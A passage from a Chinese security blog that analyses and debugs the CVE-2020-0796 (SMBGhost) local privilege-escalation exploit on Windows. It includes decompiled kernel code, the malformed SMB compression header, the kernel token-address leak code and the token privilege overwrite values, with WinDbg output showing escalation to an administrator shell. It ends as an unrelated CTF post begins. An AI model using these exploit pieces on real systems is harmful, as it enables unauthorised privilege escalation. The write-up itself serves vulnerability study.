<p><code>SrvNetAllocateBufferFromPool</code>函数调用<code>ExAllocatePoolWithTag</code>函数分配内存，分配之后对内存做了初始化操作，最后返回了一个内存信息结构体指针作为函数的返回值。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">return_buffer = (<span class="keyword">unsigned</span> __int64)&amp;v8[v2 + <span class="number">0x57</span>] &amp; <span class="number">0xFFFFFFFFFFFFFFF8</span>ui64;<span class="comment">// return_buf等于分配的alloc_buf+0x1150</span></span><br><span class="line">*(_QWORD *)(return_buffer + <span class="number">48</span>) = v8;</span><br><span class="line">*(_QWORD *)(return_buffer + <span class="number">80</span>) = (return_buffer + v5 + <span class="number">151</span>) &amp; <span class="number">0xFFFFFFFFFFFFFFF8</span>ui64;</span><br><span class="line">v13 = (return_buffer + <span class="number">151</span>) &amp; <span class="number">0xFFFFFFFFFFFFFFF8</span>ui64;</span><br><span class="line">*(_QWORD *)(return_buffer + <span class="number">0x18</span>) = v8 + <span class="number">0x50</span>;<span class="comment">// return_buf+0x18存储的地址指向解压后数据的存储地址</span></span><br></pre></td></tr></table></figure>
<p>最后的数据结构的示意图如下图所示，整个大的结构是<code>ExAllocatePoolWithTag</code>分配的，这点很好理解，我们按照分配链往下走，最后负责分配的一定是要分配最多空间的，回溯的时候不同部分给不同函数做管理使用。分配的整个空间的前0x50字节不知道用来做什么，再往下的<code>user_buf</code>就是用户可以操作的部分，这部分用来存放我们的数据。再往下偏移为0x1150处是一个内存管理结构体，这个结构体指针将作为返回值<code>return_buf</code>返回给最开始的那个分配函数，其偏移为0x18处存储着<code>user_buf</code>的地址。</p>
<p><img src="/2021/01/30/cve-2020-0796/7.png" alt></p>
<p>另外解压还有个关键的条件是我们解压后的数据大小要和原字段中的大小相同，我们可以看到在<code>RtlDecompressBufferEx2</code>执行完后有一处<code>*FinalUncompressedSize1 = UncompressedBufferSize1;</code>，这个赋值导致最后的结果恒成立。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">SmbCompressionDecompress</span><span class="params">(<span class="keyword">int</span> CompressAlog, __int64 CompressedBuffer, <span class="keyword">int</span> CompressedBufferSize, __int64 UncompressedBuffer, <span class="keyword">unsigned</span> <span class="keyword">int</span> UncompressedBufferSize, <span class="keyword">unsigned</span> <span class="keyword">int</span> *FinalUncompressedSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  PVOID WorkSpace; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// ecx</span></span><br><span class="line">  USHORT CompressionFormat; <span class="comment">// bx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> *FinalUncompressedSize1; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> UncompressedBufferSize1; <span class="comment">// ebp</span></span><br><span class="line">  <span class="keyword">int</span> CompressedBufferSize1; <span class="comment">// [rsp+20h] [rbp-48h]</span></span><br><span class="line">  ULONG CompressFragmentWorkSpaceSize[<span class="number">4</span>]; <span class="comment">// [rsp+40h] [rbp-28h] BYREF</span></span><br><span class="line">  ULONG CompressBufferWorkSpaceSize; <span class="comment">// [rsp+70h] [rbp+8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  CompressFragmentWorkSpaceSize[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  WorkSpace = <span class="number">0</span>i64;</span><br><span class="line">  CompressBufferWorkSpaceSize = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !CompressAlog )</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="number">-1073741637</span>;</span><br><span class="line">  v11 = CompressAlog - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v11 )</span><br><span class="line">  &#123;</span><br><span class="line">    v12 = v11 - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v12 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v12 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="number">-1073741637</span>;</span><br><span class="line">      CompressionFormat = <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      CompressionFormat = <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    CompressionFormat = <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( RtlGetCompressionWorkSpaceSize(CompressionFormat, &amp;CompressBufferWorkSpaceSize, CompressFragmentWorkSpaceSize) &lt; <span class="number">0</span></span><br><span class="line">    || (WorkSpace = ExAllocatePoolWithTag((POOL_TYPE)<span class="number">512</span>, CompressBufferWorkSpaceSize, <span class="number">0x2532534C</span>u)) != <span class="number">0</span>i64 )</span><br><span class="line">  &#123;</span><br><span class="line">    FinalUncompressedSize1 = FinalUncompressedSize;</span><br><span class="line">    CompressedBufferSize1 = CompressedBufferSize;</span><br><span class="line">    UncompressedBufferSize1 = UncompressedBufferSize;</span><br><span class="line">    v10 = RtlDecompressBufferEx2(</span><br><span class="line">            CompressionFormat,</span><br><span class="line">            UncompressedBuffer,</span><br><span class="line">            UncompressedBufferSize,</span><br><span class="line">            CompressedBuffer,</span><br><span class="line">            CompressedBufferSize1,</span><br><span class="line">            <span class="number">4096</span>,</span><br><span class="line">            FinalUncompressedSize,</span><br><span class="line">            WorkSpace,</span><br><span class="line">            CompressFragmentWorkSpaceSize[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">if</span> ( v10 &gt;= <span class="number">0</span> )</span><br><span class="line">      *FinalUncompressedSize1 = UncompressedBufferSize1;<span class="comment">// 这里</span></span><br><span class="line">    <span class="keyword">if</span> ( WorkSpace )</span><br><span class="line">      ExFreePoolWithTag(WorkSpace, <span class="number">0x2532534C</span>u);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v10 = <span class="number">-1073741670</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>继续往后看，解压后的数据将会填充到<code>user_buf+0x10</code>的位置，我们填充的数据如下，我们将从实际分配的内存+0x60处开始拷贝，也就是拷贝到距离0x1150+0x18的地方填充上<code>ktoken+0x40</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">memset</span>(buffer, <span class="string">'A'</span>, <span class="number">0x1108</span>);</span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(buffer + <span class="number">0x1108</span>) = ktoken + <span class="number">0x40</span>; <span class="comment">/* where we want to write */</span></span><br></pre></td></tr></table></figure>
<p><img src="/2021/01/30/cve-2020-0796/8.png" alt></p>
<p>随后在<code>memmove((alloc_buffer+0x18)，SMB_payload，offset</code>调用中可以向权限结构体里写入<code>SMB_payload</code>从而提权成功，至此exp这个进程的权限提升到了管理员，后面再在进程中注入shellcode执行恶意功能。</p>
<p>exp中获取token的代码如下，通过<code>OpenProcessToken</code>获取当前进程的权限令牌，再通过<code>get_handle_addr</code>函数获取令牌的地址。</p>
<ul>
<li>在Windows上有一些众所周知的信息泄漏技巧，如本例中使用的NtQuerySystemInformation函数。这个函数有一些神奇的功能，它会返回许多内核地址。我们主要感兴趣的是此函数能够提供目前分配的每个对象的列表，使用SystemExtendedHandleInformation参数调用NtQuerySystemInformation，我们可以得到SYSTEM_HANDLE_INFORMATION_EX结构。借助此列表，我们可以使用PID和句柄获取所需对象的内核地址。</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">ULONG64 <span class="title">get_handle_addr</span><span class="params">(HANDLE h)</span> </span>&#123;</span><br><span class="line">	ULONG len = <span class="number">20</span>;</span><br><span class="line">	NTSTATUS status = (NTSTATUS)<span class="number">0xc0000004</span>;</span><br><span class="line">	PSYSTEM_HANDLE_INFORMATION_EX pHandleInfo = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">		len *= <span class="number">2</span>;</span><br><span class="line">		pHandleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)GlobalAlloc(GMEM_ZEROINIT, len);</span><br><span class="line">		status = NtQuerySystemInformation(SystemExtendedHandleInformation, pHandleInfo, len, &amp;len);</span><br><span class="line">	&#125; <span class="keyword">while</span> (status == (NTSTATUS)<span class="number">0xc0000004</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (status != (NTSTATUS)<span class="number">0x0</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"NtQuerySystemInformation() failed with error: %#x\n"</span>, status);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	DWORD mypid = GetProcessId(GetCurrentProcess());</span><br><span class="line">	ULONG64 ptrs[<span class="number">1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; pHandleInfo-&gt;NumberOfHandles; i++) &#123;</span><br><span class="line">		PVOID object = pHandleInfo-&gt;Handles[i].Object;</span><br><span class="line">		ULONG_PTR handle = pHandleInfo-&gt;Handles[i].HandleValue;</span><br><span class="line">		DWORD pid = (DWORD)pHandleInfo-&gt;Handles[i].UniqueProcessId;</span><br><span class="line">		<span class="keyword">if</span> (pid != mypid)</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		<span class="keyword">if</span> (handle == (ULONG_PTR)h)</span><br><span class="line">			<span class="keyword">return</span> (ULONG64)object;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">ULONG64 <span class="title">get_process_token</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	HANDLE token;</span><br><span class="line">	HANDLE proc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());</span><br><span class="line">	<span class="keyword">if</span> (proc == INVALID_HANDLE_VALUE)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	OpenProcessToken(proc, TOKEN_ADJUST_PRIVILEGES, &amp;token);</span><br><span class="line">	ULONG64 ktoken = get_handle_addr(token);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ktoken;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>参考<a href="https://www.cnblogs.com/flycat-2016/p/5450247.html" target="_blank" rel="noopener">CVE-2014-4113 Win8.1 64位利用</a>看下如何获得高权限的TOKEN，内核中TOKEN对象结构中有一个很重要的SEP_TOKEN_PRIVILEGES结构，其中的每一位都代表一种权限，如下所示，Present字段表示启用的特权，Enabled字段表示拥有的特权.在决定一个Token所表示的权限时，SEP_TOKEN_PRIVILEGES结构中的Enable的值是真正起作用的。可见似乎可以通过改写[TOKEN+0x48]处的值来改变权限。</p>
<p>SEP_TOKEN_PRIVILEGES结构中最重要的是SeDebugPrivilege权限。只要具有该权限，就可以调试系统进程，也就具有注入代码到系统进程并远程执行的权限，等于有了管理员权限。所以一定得保证该标志位为1。</p>
<p><img src="/2021/01/30/cve-2020-0796/10.png" alt></p>
<p><img src="/2021/01/30/cve-2020-0796/9.png" alt></p>
<p>可以看这篇文章看下如何查看令牌权限的变化。</p>
<p><a href="https://zhuanlan.zhihu.com/p/133514866" target="_blank" rel="noopener">漏洞利用视角下的CVE-2020-0796漏洞</a></p>
<p>在我们的exp里的令牌数据赋值发生在下面</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">*(<span class="keyword">uint64_t</span>*)(packet + <span class="keyword">sizeof</span>(buf)) = <span class="number">0x1FF2FFFFBC</span>;</span><br><span class="line">*(<span class="keyword">uint64_t</span>*)(packet + <span class="keyword">sizeof</span>(buf) + <span class="number">0x8</span>) = <span class="number">0x1FF2FFFFBC</span>;</span><br></pre></td></tr></table></figure>
<h2 id="漏洞调试"><a href="#漏洞调试" class="headerlink" title="漏洞调试"></a>漏洞调试</h2><p>开机之后attach上去下断点，而后<code>g</code>或者<code>F5</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0: kd&gt; bl</span><br><span class="line">     0 e Disable Clear  fffff804`1c967e60     0001 (0001) srv2!Srv2DecompressData</span><br><span class="line">     1 e Disable Clear  fffff804`1c7d6730     0001 (0001) srvnet!SrvNetAllocateBuffer</span><br><span class="line">     2 e Disable Clear  fffff804`1c7ee4b0     0001 (0001) srvnet!SmbCompressionDecompress</span><br><span class="line">     3 e Disable Clear  fffff804`1c95f5c0     0001 (0001) srv2!memcpy</span><br></pre></td></tr></table></figure>
<p>多搞几次断到<code>Srv2DecompressData</code>，运行到<code>mov     rax, qword ptr [rax+18h]</code>的赋值，这对应函数中的<code>smb_ct_heder = *(__m128i *)*(_QWORD *)(smb_ct_header + 0x18);</code>，<code>d rax</code>查看<code>rax</code>寄存器的数据，对应exp构造的smb header，offset后面跟的就是压缩的数据，注意数据前0x10被赋值为了特权令牌的关键权限位。</p>
<p><img src="/2021/01/30/cve-2020-0796/11.png" alt></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">uint8_t</span> buf[] = &#123;</span><br><span class="line">	<span class="comment">/* NetBIOS Wrapper */</span></span><br><span class="line">	<span class="number">0x00</span>,</span><br><span class="line">	<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x33</span>,</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* SMB Header */</span></span><br><span class="line">	<span class="number">0xFC</span>, <span class="number">0x53</span>, <span class="number">0x4D</span>, <span class="number">0x42</span>, <span class="comment">/* protocol id */</span></span><br><span class="line">	<span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="comment">/* original decompressed size, trigger arithmetic overflow */</span></span><br><span class="line">	<span class="number">0x02</span>, <span class="number">0x00</span>,             <span class="comment">/* compression algorithm, LZ77 */</span></span><br><span class="line">	<span class="number">0x00</span>, <span class="number">0x00</span>,             <span class="comment">/* flags */</span></span><br><span class="line">	<span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="comment">/* offset */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>g fffff8041c967ee0</code>跳到调用<code>srvnet!SrvNetAllocateBuffer</code>处，查看参数，为<code>0xf和0</code></p>
<p><img src="/2021/01/30/cve-2020-0796/12.png" alt></p>
<p><code>p</code>之后进入函数，<code>gu</code>等于gdb的<code>finish</code>，执行完当前函数返回值存放在rax中，<code>ffff900c03a60150</code>+0x18处保存着<code>user_buf</code>地址</p>
<p><img src="/2021/01/30/cve-2020-0796/13.png" alt></p>
<p><code>g</code>运行到下一个断点即<code>srvnet!SmbCompressionDecompress</code>，我们还是<code>gu</code>执行完这个函数，然后<code>d ffff900c03a60150</code>查看<code>return_buf</code>存储的<code>user_buf</code>已经被改成了<code>ktoken_addr+0x40</code>。</p>
<p><img src="/2021/01/30/cve-2020-0796/14.png" alt></p>
<p>我们使用<code>!process 0 0</code>找寻系统的所有进程，找到漏洞程序 cve-2020-0796-local.exe所在的进程地址，输入<code>dt _EPROCESS addr</code>来查看该进程的数据结构，在 0x360处我们能找到token结构，这里直接点击该成员就会展示出来。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PROCESS ffff900c0291f080</span><br><span class="line">    SessionId: 1  Cid: 21c8    Peb: 1003f5000  ParentCid: 0714</span><br><span class="line">    DirBase: 00ed0000  ObjectTable: ffffa38bcfc9b800  HandleCount:  58.</span><br><span class="line">    Image: cve-2020-0796-local.exe</span><br></pre></td></tr></table></figure>
<p><img src="/2021/01/30/cve-2020-0796/15.png" alt></p>
<ul>
<li>你可能已经注意到在_EPROCESS结构体中，token字段是以_EX_FAST_REF来声明的而不是期望的_TOKEN结构。_EX_FAST_REF结构是一种技巧，它依赖于一种假定，在16字节的边界上需要将内核数据结构对齐到内存中。这意味着一个指向token或其他任何内核对象的指针最低的4个位永远都是0（十六进制就是最后一个数永远为0）。Windows因此可以自由的使用该指针的低4位用于其他目的.</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2: kd&gt; dt _EX_FAST_REF</span><br><span class="line">nt!_EX_FAST_REF</span><br><span class="line">   +0x000 Object           : Ptr64 Void</span><br><span class="line">   +0x000 RefCnt           : Pos 0, 4 Bits</span><br><span class="line">   +0x000 Value            : Uint8B</span><br></pre></td></tr></table></figure>
<p>从_EX_FAST_REF中获取实际的指针只需要简单的修改最后的一位十六进制数位0即可。通过程序实现的话，就将最低4位的值与0值按位与。</p>
<p>可以通过dt _TOKEN或更好的!token扩展命令来显示一个token。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2: kd&gt; dt _TOKEN</span><br><span class="line">nt!_TOKEN</span><br><span class="line">   +0x000 TokenSource      : _TOKEN_SOURCE</span><br><span class="line">   +0x010 TokenId          : _LUID</span><br><span class="line">   +0x018 AuthenticationId : _LUID</span><br><span class="line">   +0x020 ParentTokenId    : _LUID</span><br><span class="line">   +0x028 ExpirationTime   : _LARGE_INTEGER</span><br><span class="line">   +0x030 TokenLock        : Ptr64 _ERESOURCE</span><br><span class="line">   +0x038 ModifiedId       : _LUID</span><br><span class="line">   +0x040 Privileges       : _SEP_TOKEN_PRIVILEGES</span><br><span class="line">   +0x058 AuditPolicy      : _SEP_AUDIT_POLICY</span><br><span class="line">   +0x078 SessionId        : Uint4B</span><br><span class="line">   +0x07c UserAndGroupCount : Uint4B</span><br><span class="line">   +0x080 RestrictedSidCount : Uint4B</span><br><span class="line">   +0x084 VariableLength   : Uint4B</span><br><span class="line">   +0x088 DynamicCharged   : Uint4B</span><br><span class="line">   +0x08c DynamicAvailable : Uint4B</span><br><span class="line">   +0x090 DefaultOwnerIndex : Uint4B</span><br><span class="line">   +0x098 UserAndGroups    : Ptr64 _SID_AND_ATTRIBUTES</span><br><span class="line">   +0x0a0 RestrictedSids   : Ptr64 _SID_AND_ATTRIBUTES</span><br><span class="line">   +0x0a8 PrimaryGroup     : Ptr64 Void</span><br><span class="line">   +0x0b0 DynamicPart      : Ptr64 Uint4B</span><br><span class="line">   +0x0b8 DefaultDacl      : Ptr64 _ACL</span><br><span class="line">   +0x0c0 TokenType        : _TOKEN_TYPE</span><br><span class="line">   +0x0c4 ImpersonationLevel : _SECURITY_IMPERSONATION_LEVEL</span><br><span class="line">   +0x0c8 TokenFlags       : Uint4B</span><br><span class="line">   +0x0cc TokenInUse       : UChar</span><br><span class="line">   +0x0d0 IntegrityLevelIndex : Uint4B</span><br><span class="line">   +0x0d4 MandatoryPolicy  : Uint4B</span><br><span class="line">   +0x0d8 LogonSession     : Ptr64 _SEP_LOGON_SESSION_REFERENCES</span><br><span class="line">   +0x0e0 OriginatingLogonSession : _LUID</span><br><span class="line">   +0x0e8 SidHash          : _SID_AND_ATTRIBUTES_HASH</span><br><span class="line">   +0x1f8 RestrictedSidHash : _SID_AND_ATTRIBUTES_HASH</span><br><span class="line">   +0x308 pSecurityAttributes : Ptr64 _AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION</span><br><span class="line">   +0x310 Package          : Ptr64 Void</span><br><span class="line">   +0x318 Capabilities     : Ptr64 _SID_AND_ATTRIBUTES</span><br><span class="line">   +0x320 CapabilityCount  : Uint4B</span><br><span class="line">   +0x328 CapabilitiesHash : _SID_AND_ATTRIBUTES_HASH</span><br><span class="line">   +0x438 LowboxNumberEntry : Ptr64 _SEP_LOWBOX_NUMBER_ENTRY</span><br><span class="line">   +0x440 LowboxHandlesEntry : Ptr64 _SEP_CACHED_HANDLES_ENTRY</span><br><span class="line">   +0x448 pClaimAttributes : Ptr64 _AUTHZBASEP_CLAIM_ATTRIBUTES_COLLECTION</span><br><span class="line">   +0x450 TrustLevelSid    : Ptr64 Void</span><br><span class="line">   +0x458 TrustLinkedToken : Ptr64 _TOKEN</span><br><span class="line">   +0x460 IntegrityLevelSidValue : Ptr64 Void</span><br><span class="line">   +0x468 TokenSidValues   : Ptr64 _SEP_SID_VALUES_BLOCK</span><br><span class="line">   +0x470 IndexEntry       : Ptr64 _SEP_LUID_TO_INDEX_MAP_ENTRY</span><br><span class="line">   +0x478 DiagnosticInfo   : Ptr64 _SEP_TOKEN_DIAG_TRACK_ENTRY</span><br><span class="line">   +0x480 BnoIsolationHandlesEntry : Ptr64 _SEP_CACHED_HANDLES_ENTRY</span><br><span class="line">   +0x488 SessionObject    : Ptr64 Void</span><br><span class="line">   +0x490 VariablePart     : Uint8B</span><br></pre></td></tr></table></figure>
<p>得到token实际地址<code>ffffa38bd189d770</code>后查看其结构.<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2: kd&gt; ? 0xffffa38bd189d778 &amp; ffffffff`fffffff0</span><br><span class="line">Evaluate expression: -101654065457296 = ffffa38b`d189d770</span><br><span class="line">2: kd&gt; !token ffffa38b`d189d770</span><br><span class="line">_TOKEN 0xffffa38bd189d770</span><br><span class="line">TS Session ID: 0x1</span><br><span class="line">User: S-1-5-21-3965716127-288158643-3447225976-1001</span><br><span class="line">User Groups: </span><br><span class="line"> 00 S-1-16-8192</span><br><span class="line">    Attributes - GroupIntegrity GroupIntegrityEnabled </span><br><span class="line"> 01 S-1-1-0</span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> 02 S-1-5-114</span><br><span class="line">    Attributes - DenyOnly </span><br><span class="line"> 03 S-1-5-32-544</span><br><span class="line">    Attributes - DenyOnly </span><br><span class="line"> 04 S-1-5-32-545</span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> 05 S-1-5-4</span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> 06 S-1-2-1</span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> 07 S-1-5-11</span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> 08 S-1-5-15</span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> 09 S-1-11-96-3623454863-58364-18864-2661722203-1597581903-3040155090-2699348868-2212403739-2132912781-15699764</span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> 10 S-1-5-113</span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> 11 S-1-5-5-0-183069</span><br><span class="line">    Attributes - Mandatory Default Enabled LogonId </span><br><span class="line"> 12 S-1-2-0</span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> 13 S-1-5-64-36</span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line">Primary Group: S-1-5-21-3965716127-288158643-3447225976-1001</span><br><span class="line">Privs: </span><br><span class="line"> 19 0x000000013 SeShutdownPrivilege               Attributes - </span><br><span class="line"> 23 0x000000017 SeChangeNotifyPrivilege           Attributes - Enabled Default </span><br><span class="line"> 25 0x000000019 SeUndockPrivilege                 Attributes - </span><br><span class="line"> 33 0x000000021 SeIncreaseWorkingSetPrivilege     Attributes - </span><br><span class="line"> 34 0x000000022 SeTimeZonePrivilege               Attributes - </span><br><span class="line">Authentication ID:         (0,2e63f)</span><br><span class="line">Impersonation Level:       Anonymous</span><br><span class="line">TokenType:                 Primary</span><br><span class="line">Source: User32             TokenFlags: 0x2a00 ( Token in use )</span><br><span class="line">Token ID: 17774c           ParentToken ID: 0</span><br><span class="line">Modified ID:               (0, 2e64d)</span><br><span class="line">RestrictedSidCount: 0      RestrictedSids: 0x0000000000000000</span><br><span class="line">OriginatingLogonSession: 3e7</span><br><span class="line">PackageSid: (null)</span><br><span class="line">CapabilityCount: 0      Capabilities: 0x0000000000000000</span><br><span class="line">LowboxNumberEntry: 0x0000000000000000</span><br><span class="line">Security Attributes:</span><br><span class="line">Unable to get the offset of nt!_AUTHZBASEP_SECURITY_ATTRIBUTE.ListLink</span><br><span class="line">Process Token TrustLevelSid: (null)</span><br></pre></td></tr></table></figure></p>
<p><code>ffffa38bd189d770+0x40=ffffa38bd189d7b0</code>(回看下刚才的buf+0x18修改的值可以对应上)，我们使用<code>SEP_TOKEN_PRIVILEGES</code>结构查看这里的值，可以看到权限较低。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2: kd&gt; dt nt!_SEP_TOKEN_PRIVILEGES ffffa38bd189d7b0</span><br><span class="line">   +0x000 Present          : 0x00000006`02880000</span><br><span class="line">   +0x008 Enabled          : 0x800000</span><br><span class="line">   +0x010 EnabledByDefault : 0x40800000</span><br></pre></td></tr></table></figure>
<p>我们使用<code>gu addr</code>运行到<code>memmove</code>这里，rcx rdx r8分别对应三个参数，查看此时的数据可以看到我们拷贝了0x10的特权进程的数据进去。</p>
<p><img src="/2021/01/30/cve-2020-0796/16.png" alt></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2: kd&gt; dq rcx</span><br><span class="line">ffffa38b`d189d7b0  00000006`02880000 00000000`00800000</span><br><span class="line">ffffa38b`d189d7c0  00000000`40800000 00000000`00000000</span><br><span class="line">ffffa38b`d189d7d0  00000000`00000000 00000000`00000000</span><br><span class="line">ffffa38b`d189d7e0  00010000`00000000 0000000f`00000001</span><br><span class="line">ffffa38b`d189d7f0  00000210`00000000 00000000`00001000</span><br><span class="line">ffffa38b`d189d800  0057002e`00000000 ffffa38b`d189dc00</span><br><span class="line">ffffa38b`d189d810  00000000`00000000 ffffa38b`ce869cc0</span><br><span class="line">ffffa38b`d189d820  ffffa38b`ce869cc0 ffffa38b`ce869cdc</span><br><span class="line">2: kd&gt; dq rdx</span><br><span class="line">ffff900c`01714590  0000001f`f2ffffbc 0000001f`f2ffffbc</span><br><span class="line">ffff900c`017145a0  0f000741`403fffff 8bd189d7`b01104ff</span><br><span class="line">ffff900c`017145b0  00000000`00ffffa3 00000000`00000000</span><br><span class="line">ffff900c`017145c0  00000000`00080024 cdab0201`0000007f</span><br><span class="line">ffff900c`017145d0  cdab0201`cdab0201 00000078`cdab0201</span><br><span class="line">ffff900c`017145e0  02100202`00000002 03020300`02240222</span><br><span class="line">ffff900c`017145f0  00000000`03110310 00000000`00260001</span><br><span class="line">ffff900c`01714600  00000001`00200001 00000000`00000000</span><br></pre></td></tr></table></figure>
<p>拷贝之后再看，token的标志位成功修改。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2: kd&gt; dq ffffa38b`d189d7b0 L2</span><br><span class="line">ffffa38b`d189d7b0  0000001f`f2ffffbc 0000001f`f2ffffbc</span><br><span class="line">2: kd&gt; dt nt!_SEP_TOKEN_PRIVILEGES ffffa38bd189d7b0</span><br><span class="line">   +0x000 Present          : 0x0000001f`f2ffffbc</span><br><span class="line">   +0x008 Enabled          : 0x0000001f`f2ffffbc</span><br><span class="line">   +0x010 EnabledByDefault : 0x40800000</span><br></pre></td></tr></table></figure>
<p><code>disable</code>掉所有断点再<code>g</code>，最终调用shellcode弹出了cmd窗口并且权限为管理员。</p>
<p><img src="/2021/01/30/cve-2020-0796/17.png" alt></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://a1ex.online/2021/01/12/CVE-2020-0796%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">CVE-2020-0796调试分析</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/133514866" target="_blank" rel="noopener">漏洞利用视角下的CVE-2020-0796漏洞</a></p>
<p><a href="https://github.com/wangray/WinDBG-for-GDB-users" target="_blank" rel="noopener">WinDBG-for-GDB-users</a></p>
<p><a href="https://bbs.pediy.com/thread-224058.htm" target="_blank" rel="noopener">[翻译]Windows x64内核提权</a></p>
<p><a href="https://mp.weixin.qq.com/s/kWKzbjz8CHTaNgRBhqJHpg" target="_blank" rel="noopener">Windows SMB Ghost（CVE-2020-0796）漏洞分析</a></p>
]]></content>
  </entry>
  <entry>
    <title>ddctf2020</title>
    <url>/2020/09/06/ddctf2020/</url>
    <content><![CDATA[<h1 id="DDCTF2020-amp-amp-柏鹭杯2020-amp-amp-北京市网络安全宣传周技能赛-PWN-wp"><a href="#DDCTF2020-amp-amp-柏鹭杯2020-amp-amp-北京市网络安全宣传周技能赛-PWN-wp" class="headerlink" title="DDCTF2020 &amp;&amp; 柏鹭杯2020 &amp;&amp; 北京市网络安全宣传周技能赛 PWN wp"></a>DDCTF2020 &amp;&amp; 柏鹭杯2020 &amp;&amp; 北京市网络安全宣传周技能赛 PWN wp</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这几个比赛连着打的，PWN题也比较少，写到一个里了，后两场比赛队友带飞拿了第一。</p>
